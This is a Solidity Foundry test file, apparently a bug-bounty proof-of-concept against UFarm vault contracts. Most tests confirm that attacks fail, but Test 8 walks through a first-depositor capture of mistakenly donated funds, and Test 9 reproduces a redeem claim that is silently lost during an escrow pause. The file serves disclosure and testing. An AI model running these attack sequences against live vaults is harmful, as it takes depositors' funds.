// SPDX-License-Identifier: BUSL-1.1
/**
 * @title UFarm Digital - Redeem claim deleted before escrow release; claim lost when release fails, redeem returns 0
 * @notice PoC for Remedy submission (F-04 / C-1)
 * @dev Demonstrates the silent zero-claim: _claimRedeemAssets deletes the
 *      claimable redeem before _releaseAvailableEscrow, so a release revert
 *      (e.g. escrow pause) wipes the claim and redeem() returns 0.
 *
 * Vulnerable contract: VaultLifecycleModule (UFarmVault)
 * Vulnerable function: _claimRedeemAssets / _releaseAvailableEscrow
 * Vulnerable lines: VaultLifecycleModule.sol:768 (claim deleted),
 *   :769 (escrow release), :934-951 (catch swallows the revert, returns 0);
 *   same pattern in cancelDeposit (:182-183 delete, :185 release).
 *   Pause bit: ESCROW_OPERATIONS_PAUSED, PauseMask.sol:16 (1 << 10).
 * Program: https://hunt.r.xyz/programs/ufarm-digital
 * Report: https://hunt.r.xyz/report-thread/e7f33e41-46e8-43b6-96e0-e1dade3af3e3
 * Severity: Low
 * Target: UFarmDigital/UFarm-EVM-Contracts @ b19a6511 ("Production Release 2.1.1")
 */
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UFarmVault} from "../src/vault/UFarmVault.sol";
import {VaultLifecycleModule} from "../src/vault/modules/VaultLifecycleModule.sol";
import {VaultAdminConfigModule} from "../src/vault/modules/VaultAdminConfigModule.sol";
import {VaultAdapterGatewayModule} from "../src/vault/modules/VaultAdapterGatewayModule.sol";
import {UFarmEscrow} from "../src/escrow/UFarmEscrow.sol";
import {IUFarmVaultRequests} from "../src/interfaces/IUFarmVaultRequests.sol";
import {IUFarmEscrow} from "../src/interfaces/IUFarmEscrow.sol";
import {MockCore, MockCurator, MockOracle} from "./mocks/Mocks.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock USD", "mUSD") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

/// @notice PoC tests for the vault core logic — verifies the key NEGATIVE claims:
///  1. first-depositor donation inflation yields zero profit (guard OFF by default),
///  2. rounding-to-zero deposits fail safely and funds stay recoverable,
///  3. signed-request minOutputAmount is enforced at settlement,
///  4. signed requests cannot be replayed,
///  5. zero-amount requests cannot create stale buckets (UFARM1-4 regression),
///  6. pending queue caps at 10 (griefing surface measurement).
contract VaultCorePoC is Test {
    uint256 internal constant MEMBER = 1 << 253;
    uint256 internal constant VAULT_SETTLE_MANAGER = 1 << 1;
    uint256 internal constant VAULT_CUSTOMER_MANAGER = 1 << 3;

    MockCore core;
    MockCurator curator;
    MockOracle oracle;
    UFarmEscrow escrow;
    MockToken asset;
    UFarmVault vault;

    uint256 ownerPk = 0xA11CE;
    uint256 attackerPk = 0xB0B;
    uint256 victimPk = 0xC1C7;
    address owner;
    address attacker;
    address victim;
    address settleManager = address(0x5E771E);
    address vaultOwner;

    bytes32 constant LIFECYCLE = keccak256("ufarm.vault.module.lifecycle");
    bytes32 constant ADMIN_CONFIG = keccak256("ufarm.vault.module.admin-config");
    bytes32 constant ADAPTER_GATEWAY = keccak256("ufarm.vault.module.adapter-gateway");

    function setUp() public {
        owner = vm.addr(ownerPk);
        attacker = vm.addr(attackerPk);
        victim = vm.addr(victimPk);
        vaultOwner = owner;

        core = new MockCore();
        curator = new MockCurator();
        oracle = new MockOracle();
        asset = new MockToken();
        UFarmEscrow escrowImpl = new UFarmEscrow();
        bytes memory escrowInit = abi.encodeCall(UFarmEscrow.initialize, (address(core)));
        ERC1967Proxy escrowProxy = new ERC1967Proxy(address(escrowImpl), escrowInit);
        escrow = UFarmEscrow(address(escrowProxy));
        core.setEscrow(address(escrow));
        core.setOracle(address(oracle));
        core.setCurator(address(curator));

        VaultLifecycleModule lifecycle = new VaultLifecycleModule();
        VaultAdminConfigModule adminConfig = new VaultAdminConfigModule();
        VaultAdapterGatewayModule gateway = new VaultAdapterGatewayModule();
        core.setModule(LIFECYCLE, address(lifecycle));
        core.setModule(ADMIN_CONFIG, address(adminConfig));
        core.setModule(ADAPTER_GATEWAY, address(gateway));

        UFarmVault impl = new UFarmVault();
        bytes memory initData = abi.encodeCall(
            UFarmVault.initialize,
            (address(core), address(curator), vaultOwner, bytes32("salt"), "UFarm Vault", "uFV", address(asset))
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        vault = UFarmVault(payable(address(proxy)));

        vm.prank(vaultOwner);
        vault.setPermissionMask(settleManager, MEMBER | VAULT_SETTLE_MANAGER | VAULT_CUSTOMER_MANAGER);
    }

    // --- helpers ---
    function _fund(address who, uint256 amt) internal {
        asset.mint(who, amt);
        vm.prank(who);
        asset.approve(address(escrow), type(uint256).max);
    }

    function _settle(uint256 nav) internal {
        vm.prank(settleManager);
        vault.settleRequests();
        uint256 reqId = vault.activeOracleRequestId();
        oracle.deliver(address(vault), reqId, nav, uint64(block.timestamp));
    }

    function _eip712Digest(bytes32 structHash) internal view returns (bytes32) {
        bytes32 domain = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("UFarmVault"),
                keccak256("2"),
                block.chainid,
                address(vault)
            )
        );
        return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
    }

    function _signDeposit(uint256 signerPk, address asset_, uint256 amount, uint256 minOut, uint256 nonce, uint256 deadline)
        internal view returns (IUFarmVaultRequests.SignedRequest memory)
    {
        address signer = vm.addr(signerPk);
        bytes32 reqHash = keccak256(
            abi.encode(
                keccak256("RequestParams(address asset,uint256 amount,uint256 minOutputAmount,address controller,address owner)"),
                asset_, amount, minOut, signer, signer
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("SignedDepositRequest(RequestParams request,uint256 nonce,uint256 deadline)RequestParams(address asset,uint256 amount,uint256 minOutputAmount,address controller,address owner)"),
                reqHash, nonce, deadline
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, _eip712Digest(structHash));
        return IUFarmVaultRequests.SignedRequest({
            request: IUFarmVaultRequests.RequestParams({
                asset: asset_, amount: amount, minOutputAmount: minOut, controller: signer, owner: signer
            }),
            nonce: nonce,
            deadline: deadline,
            signature: abi.encodePacked(r, s, v)
        });
    }

    function _signRedeem(uint256 signerPk, address asset_, uint256 amount, uint256 minOut, uint256 nonce, uint256 deadline)
        internal view returns (IUFarmVaultRequests.SignedRequest memory)
    {
        address signer = vm.addr(signerPk);
        bytes32 reqHash = keccak256(
            abi.encode(
                keccak256("RequestParams(address asset,uint256 amount,uint256 minOutputAmount,address controller,address owner)"),
                asset_, amount, minOut, signer, signer
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("SignedRedeemRequest(RequestParams request,uint256 nonce,uint256 deadline)RequestParams(address asset,uint256 amount,uint256 minOutputAmount,address controller,address owner)"),
                reqHash, nonce, deadline
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, _eip712Digest(structHash));
        return IUFarmVaultRequests.SignedRequest({
            request: IUFarmVaultRequests.RequestParams({
                asset: asset_, amount: amount, minOutputAmount: minOut, controller: signer, owner: signer
            }),
            nonce: nonce,
            deadline: deadline,
            signature: abi.encodePacked(r, s, v)
        });
    }

    function _settleBatch(
        IUFarmVaultRequests.SignedRequest[] memory deps,
        IUFarmVaultRequests.SignedRequest[] memory reds,
        uint256 nav
    ) internal {
        vm.prank(settleManager);
        vault.settleRequests(deps, reds);
        uint256 reqId = vault.activeOracleRequestId();
        oracle.deliver(address(vault), reqId, nav, uint64(block.timestamp));
    }

    // --- Test 1: donation inflation, guard OFF (default allowedPriceFluctuation == 0) ---
    function testDonationInflation_NoProfit() public {
        // Attacker: first deposit $1, settle at NAV $1 -> 1 share (1e18 base units)
        _fund(attacker, 1e18);
        vm.prank(attacker);
        vault.requestDeposit(1e18, attacker, attacker);
        _settle(1e18);
        vm.prank(attacker);
        vault.deposit(0, attacker, attacker);
        assertEq(vault.balanceOf(attacker), 1e18);

        // Attacker donates $1,000,000 straight to the vault (NAV now $1,000,001)
        asset.mint(attacker, 1_000_000e18);
        vm.prank(attacker);
        asset.transfer(address(vault), 1_000_000e18);

        // Victim deposits $1,000,000; oracle reports NAV $1,000,001 (donation included)
        _fund(victim, 1_000_000e18);
        vm.prank(victim);
        vault.requestDeposit(1_000_000e18, victim, victim);
        _settle(1_000_001e18);
        vm.prank(victim);
        vault.deposit(0, victim, victim);
        uint256 victimShares = vault.balanceOf(victim);

        // Attacker redeems everything; NAV now $2,000,001
        vm.prank(attacker);
        vault.requestRedeem(1e18, attacker, attacker);
        _settle(2_000_001e18);
        vm.prank(attacker);
        uint256 attackerOut = vault.redeem(0, attacker, attacker);

        // Victim redeems everything too
        vm.prank(victim);
        vault.requestRedeem(victimShares, victim, victim);
        _settle(2_000_001e18 - attackerOut); // NAV after attacker exit
        vm.prank(victim);
        uint256 victimOut = vault.redeem(0, victim, victim);

        emit log_named_uint("attacker in (deposit+donation)", 1_000_001e18);
        emit log_named_uint("attacker out", attackerOut);
        emit log_named_uint("victim in", 1_000_000e18);
        emit log_named_uint("victim out", victimOut);
        // Attacker must NOT profit: out <= in (plus 1 wei dust tolerance)
        assertLe(attackerOut, 1_000_001e18 + 1);
        // Victim must be made whole (minus < $1 dust)
        assertGe(victimOut, 1_000_000e18 - 1e18);
    }

    // --- Test 2: rounding-to-zero deposit fails safely, funds recoverable ---
    function testRoundingToZero_FailsSafe() public {
        // Attacker first deposit: 1 wei of shares (usdValue 1 wei)
        _fund(attacker, 1);
        vm.prank(attacker);
        vault.requestDeposit(1, attacker, attacker);
        _settle(1);
        vm.prank(attacker);
        vault.deposit(0, attacker, attacker);
        assertEq(vault.balanceOf(attacker), 1);

        // Attacker donates $1,000,000 -> price per share-unit explodes
        asset.mint(attacker, 1_000_000e18);
        vm.prank(attacker);
        asset.transfer(address(vault), 1_000_000e18);

        // Victim deposits $1: shares = 1e18 * 1 / 1e24 = 0 -> must FAIL, not be stolen
        _fund(victim, 1e18);
        vm.prank(victim);
        vault.requestDeposit(1e18, victim, victim);
        _settle(1_000_000e18 + 1);
        assertEq(vault.pendingDepositRequest(0, victim), 0);
        assertEq(vault.claimableDepositRequest(0, victim), 0);
        // Funds remain in escrow, unlocked, fully withdrawable by victim
        (uint256 bal, uint64 lockedTill) = IUFarmEscrow(address(escrow)).balanceOf(address(vault), address(asset), victim);
        assertEq(bal, 1e18);
        assertEq(lockedTill, 0);
        vm.prank(victim);
        IUFarmEscrow(address(escrow)).withdraw(address(vault), address(asset), 1e18, victim);
        assertEq(asset.balanceOf(victim), 1e18);
        // Attacker cannot extract victim funds: victim already withdrew in full above.
        // Attacker redeeming the only 1-wei share recovers ~their own $1M donation and nothing more.
        vm.prank(attacker);
        vault.requestRedeem(1, attacker, attacker);
        _settle(1_000_000e18 + 1);
        vm.prank(attacker);
        uint256 attackerOut = vault.redeem(0, attacker, attacker);
        assertGe(attackerOut, 1_000_000e18);
        assertLe(attackerOut, 1_000_000e18 + 2); // own donation back, zero profit from victim
    }

    // --- Test 3: signed minOutputAmount enforced (deposit + redeem) ---
    function testSignedMinOutput_Enforced() public {
        // Seed vault: owner deposits $1000 @ $1
        _fund(owner, 1000e18);
        vm.prank(owner);
        vault.requestDeposit(1000e18, owner, owner);
        _settle(1000e18);
        vm.prank(owner);
        vault.deposit(0, owner, owner);

        // Victim signs deposit of $100 demanding >= 150 shares (impossible if price falls)
        // Funded 200e18: the first (failed) attempt still moves 100e18 into escrow.
        _fund(victim, 200e18);
        IUFarmVaultRequests.SignedRequest memory req = _signDeposit(
            victimPk, address(asset), 100e18, 150e18, 0, block.timestamp + 1 days
        );
        IUFarmVaultRequests.SignedRequest[] memory deps = new IUFarmVaultRequests.SignedRequest[](1);
        deps[0] = req;
        IUFarmVaultRequests.SignedRequest[] memory reds = new IUFarmVaultRequests.SignedRequest[](0);
        // NAV crashes to $500: $100 buys 200 shares at true price... use NAV $2000 so $100 buys 50 shares < 150 min
        _settleBatch(deps, reds, 2000e18);
        assertEq(vault.claimableDepositRequest(0, victim), 0, "slippage-protected deposit must not settle");
        assertEq(vault.pendingDepositRequest(0, victim), 0);
        // Funds recoverable via escrow withdraw (unlocked by failure path)
        (uint256 bal,) = IUFarmEscrow(address(escrow)).balanceOf(address(vault), address(asset), victim);
        assertEq(bal, 100e18);

        // Same request shape with min 0 succeeds
        IUFarmVaultRequests.SignedRequest memory req2 = _signDeposit(
            victimPk, address(asset), 100e18, 0, 1, block.timestamp + 1 days
        );
        deps[0] = req2;
        _settleBatch(deps, reds, 2000e18);
        assertGt(vault.claimableDepositRequest(0, victim), 0);
    }

    // --- Test 4: signed request replay rejected ---
    function testSignedReplay_Rejected() public {
        _fund(victim, 100e18);
        IUFarmVaultRequests.SignedRequest memory req = _signDeposit(
            victimPk, address(asset), 100e18, 0, 0, block.timestamp + 1 days
        );
        IUFarmVaultRequests.SignedRequest[] memory deps = new IUFarmVaultRequests.SignedRequest[](2);
        deps[0] = req;
        deps[1] = req; // exact duplicate in one batch
        IUFarmVaultRequests.SignedRequest[] memory reds = new IUFarmVaultRequests.SignedRequest[](0);
        _settleBatch(deps, reds, 100e18);
        // Batch delivery already settled the deposit: pending is 0, claimable holds the assets
        assertEq(vault.pendingDepositRequest(0, victim), 0);
        assertEq(vault.claimableDepositRequest(0, victim), 100e18);
        assertEq(vault.requestNonces(victim), 1, "nonce consumed exactly once");

        // Settle, claim, then replay the same signed request in a new batch
        _settle(100e18); // no-op second oracle round? active request already consumed; this starts a fresh one
        // NOTE: _settle above starts a new oracle request with empty queues; deliver NAV 100e18
        vm.prank(victim);
        vault.deposit(0, victim, victim);
        assertEq(vault.balanceOf(victim), 100e18);

        IUFarmVaultRequests.SignedRequest[] memory deps2 = new IUFarmVaultRequests.SignedRequest[](1);
        deps2[0] = req;
        vm.prank(settleManager);
        vm.expectRevert(); // no batch accepted -> REQUEST_NO_BATCH
        vault.settleRequests(deps2, reds);
        assertEq(vault.requestNonces(victim), 1);
    }

    // --- Test 5: zero-amount requests cannot create stale buckets (UFARM1-4 regression) ---
    function testZeroAmount_NoStaleBucket() public {
        _fund(owner, 100e18);
        vm.prank(owner);
        vm.expectRevert();
        vault.requestDeposit(0, owner, owner);
        vm.prank(owner);
        vm.expectRevert();
        vault.requestRedeem(0, owner, owner);
        // Terminate must not be blocked by any zero-amount entry (queues empty)
        vm.prank(vaultOwner);
        vault.terminate();
        assertEq(uint256(vault.status()), 1); // Terminated
    }

    // --- Test 6: pending queue caps at 10 ---
    function testQueueCap_Ten() public {
        for (uint256 i = 0; i < 10; i++) {
            address u = address(uint160(0x1000 + i));
            _fund(u, 1);
            vm.prank(u);
            vault.requestDeposit(1, u, u);
        }
        address eleventh = address(0x2000);
        _fund(eleventh, 1);
        vm.prank(eleventh);
        vm.expectRevert();
        vault.requestDeposit(1, eleventh, eleventh);
    }

    // --- Test 8 (Coarena follow-up): first deposit captures PRE-EXISTING third-party donation ---
    // Mechanic confirmed: with supply==0, shares=usdValue ignores NAV, so a first depositor
    // captures any orphaned assets already in the vault. Precondition: someone ELSE's assets must
    // already sit in the vault while supply==0 (donation / mistaken direct transfer / privileged
    // adapter inflow). Attacker self-donation yields zero profit (proven in test 1).
    function testFirstDeposit_CapturesPreexistingDonation() public {
        // Innocent third party mistakenly sends $100 straight to the vault before any deposit
        address donor = address(0xD0A7);
        asset.mint(donor, 100e18);
        vm.prank(donor);
        asset.transfer(address(vault), 100e18);

        // Attacker is first depositor with $1; oracle reports NAV $101 (donation included)
        _fund(attacker, 1e18);
        vm.prank(attacker);
        vault.requestDeposit(1e18, attacker, attacker);
        _settle(101e18);
        vm.prank(attacker);
        vault.deposit(0, attacker, attacker);
        assertEq(vault.balanceOf(attacker), 1e18);

        // Attacker redeems the single share and captures the $100 donation
        vm.prank(attacker);
        vault.requestRedeem(1e18, attacker, attacker);
        _settle(101e18);
        vm.prank(attacker);
        uint256 attackerOut = vault.redeem(0, attacker, attacker);
        assertEq(attackerOut, 101e18);
    }

    // --- Test 9 (Coarena follow-up): redeem claim while ONLY escrow ops are paused ---
    // _claimRedeemAssets deletes the claimable BEFORE _releaseAvailableEscrow; if escrow's
    // releaseTo reverts (ESCROW_OPERATIONS_PAUSED), the catch returns 0 and the claim is gone,
    // BUT the escrow ledger still holds the credited assets (lockedTill==0) so the owner can
    // withdraw them directly via escrow.withdraw once unpaused. Verifies recoverability.
    function testRedeemClaim_DuringEscrowPause_RecoverableViaEscrow() public {
        _fund(owner, 1000e18);
        vm.prank(owner);
        vault.requestDeposit(1000e18, owner, owner);
        _settle(1000e18);
        vm.prank(owner);
        vault.deposit(0, owner, owner);
        vm.prank(owner);
        vault.requestRedeem(100e18, owner, owner);
        _settle(1000e18);
        assertEq(vault.claimableRedeemRequest(0, owner), 100e18);
        console.log("claimableRedeem before redeem", vault.claimableRedeemRequest(0, owner));
        console.log("owner asset balance before redeem", asset.balanceOf(owner));

        // Pause ONLY escrow operations (bit 10). Vault-level CLAIMS check does not cover this bit.
        core.setPauseMask(1 << 10);
        vm.prank(owner);
        uint256 released = vault.redeem(0, owner, owner);
        console.log("redeem() returned (during escrow pause)", released);
        console.log("claimableRedeem after redeem", vault.claimableRedeemRequest(0, owner));
        assertEq(released, 0, "claim during escrow pause silently pays 0");
        assertEq(vault.claimableRedeemRequest(0, owner), 0, "claimable is deleted");

        // Ledger backstop: credited 100e18 still sits in escrow under the owner, unlocked
        (uint256 bal, uint64 lockedTill) =
            IUFarmEscrow(address(escrow)).balanceOf(address(vault), address(asset), owner);
        console.log("escrow balance credited to owner (after lost claim)", bal);
        console.log("escrow lockedTill for that credit", lockedTill);
        assertEq(bal, 100e18);
        assertEq(lockedTill, 0);

        // After unpause, direct escrow withdraw recovers the full amount
        core.setPauseMask(0);
        vm.prank(owner);
        IUFarmEscrow(address(escrow)).withdraw(address(vault), address(asset), 100e18, owner);
        console.log("owner asset balance after direct escrow withdraw", asset.balanceOf(owner));
        assertEq(asset.balanceOf(owner), 100e18);
    }

    // --- Test 7 (documentation): direct requestDeposit carries minOutputAmount == 0 ---
    // Standard EIP-7540 methods are intentionally unprotected per Hexens UFARM2-2 fix.
    function testDirectRequest_NoSlippageProtection_Documented() public {
        _fund(owner, 1000e18);
        vm.prank(owner);
        vault.requestDeposit(1000e18, owner, owner);
        _settle(1000e18);
        vm.prank(owner);
        vault.deposit(0, owner, owner);
        // Victim uses the STANDARD method, then NAV doubles before settlement: $100 buys 50 shares, no revert
        _fund(victim, 100e18);
        vm.prank(victim);
        vault.requestDeposit(100e18, victim, victim);
        _settle(2000e18);
        vm.prank(victim);
        uint256 shares = vault.deposit(0, victim, victim);
        assertEq(shares, 50e18); // 100 * 1000 / 2000 = 50 shares; minOutput was 0 so it settled
    }
}
